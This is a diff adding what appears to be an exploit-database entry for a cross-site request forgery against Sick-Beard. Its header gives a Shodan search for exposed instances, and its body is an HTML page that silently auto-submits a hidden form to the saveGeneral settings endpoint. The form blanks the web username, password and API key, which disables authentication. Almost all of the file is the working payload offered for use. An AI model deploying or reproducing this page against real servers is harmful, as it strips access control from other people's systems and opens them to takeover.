@@ -1,0 +1,30 @@
+# Exploit Title: Sickbeard 0.1 - Cross-Site Request Forgery (Disable Authentication)
+# Google Dork: https://www.shodan.io/search?query=sickbeard
+# Date: 2020-06-06
+# Exploit Author: bdrake
+# Vendor Homepage: https://sickbeard.com/
+# Software Link: https://github.com/midgetspy/Sick-Beard
+# Version: alpha (master) -- git : 31ceaf1b5cab1884a280fe3f4609bdc3b1fb3121
+# Tested on: Fedora 32
+# CVE : NA
+
+<html>
+<body>
+	<!-- 
+		Clearing username and password disables authentication.
+		Requires a server restart for changes to take effect.
+	-->
+	<form action="http://1ocalhost:8081/config/general/saveGeneral" method="POST">
+		<input type="hidden" name="log_dir" value="Logs" />
+	   	<input type="hidden" name="web_port" value="8081" />
+   	    <input type="hidden" name="web_username" value="" />
+		<input type="hidden" name="web_password" value="" />
+		<input type="hidden" name="https_cert" value="server.crt" />
+		<input type="hidden" name="https_key" value="server.key" />
+		<input type="hidden" name="api_key" value="" />
+    </form>
+    <script>
+		document.forms[0].submit();
+    </script>
+</body>
+</html>
